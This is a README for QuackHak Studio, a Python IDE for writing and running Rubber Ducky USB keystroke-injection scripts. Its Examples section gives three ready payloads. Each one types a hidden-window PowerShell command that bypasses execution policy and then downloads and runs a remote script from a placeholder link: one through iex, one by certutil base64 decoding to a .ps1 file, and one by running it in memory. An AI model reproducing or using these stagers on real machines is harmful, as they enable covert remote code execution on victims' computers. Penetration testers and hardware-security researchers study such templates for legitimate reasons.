# QuackHak Studio

QuackHak Studio is an Integrated Development Environment (IDE) for Rubber Ducky scripts. It provides a user-friendly interface for creating and editing Rubber Ducky scripts, making it easier to write and test your payloads. With QuackHak Studio, you can write, save, and execute your Rubber Ducky scripts with ease.

## Features

- **Syntax Highlighting**: QuackHak Studio provides syntax highlighting for Rubber Ducky scripts, making it easier to identify different commands and keywords.

- **Code Execution**: You can execute your Rubber Ducky scripts directly from the IDE, allowing you to test your payloads quickly.

- **Undo/Redo**: QuackHak Studio supports undo and redo actions, making it easy to revert changes or redo previous actions.

- **Code Templates**: QuackHak Studio offers pre-defined code templates for common Rubber Ducky payloads, making it convenient to get started with scripting.

## Getting Started

1. Download and install Python if you haven't already. You can download it from the [Python website](https://www.python.org/downloads/).

2. Clone this repository or download the `quackhak.py` script.

3. Install the required dependencies using the following command:

   ```bash
   pip install PyQt5
   ```

4. Run the QuackHak Studio script using the following command:

   ```bash
   python quackhak.py
   ```

5. Start writing your Rubber Ducky scripts in the QuackHak Studio IDE.

## Usage

- **File Menu**: The File menu allows you to open, save, and save your scripts with different options.

- **Edit Menu**: The Edit menu provides options for undoing and redoing actions.

- **Tools Menu**: Access useful tools like URL shortener and GitHub directly from the IDE.

- **Run Menu**: Run your Rubber Ducky scripts directly from the IDE or execute PowerShell scripts.

## Examples

### Basic Rubber Ducky Payload

```plaintext
DELAY 2000
GUI r
DELAY 500
STRING powershell -NoP -W H -Ep Bypass irm LINK|iex;FUNCTION
DELAY 500
ENTER
```

### Base64 Encoded Payload

```plaintext
DELAY 2000
GUI r
DELAY 500
STRING powershell -NoP -W H -Ep Bypass irm LINK -O $env:USERPROFILE\e.txt;certutil -f -decode $env:USERPROFILE\e.txt $env:USERPROFILE\d.ps1;iex $env:USERPROFILE\d.ps1
DELAY 500
ENTER
```

### Memory Execution Payload

```plaintext
DELAY 2000
GUI r
DELAY 500
STRING powershell -NoP -W H -Ep Bypass &([scriptblock]::Create([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String((irm LINK)))))
DELAY 500
ENTER
```


## Author

QuackHak Studio is developed by [CaliNux](https://github.com/calinux-py).

## Acknowledgments

- Special thanks to I_am_Jakoby & Redd <3

Feel free to contribute to this project and help improve QuackHak Studio for Rubber Ducky enthusiasts. 
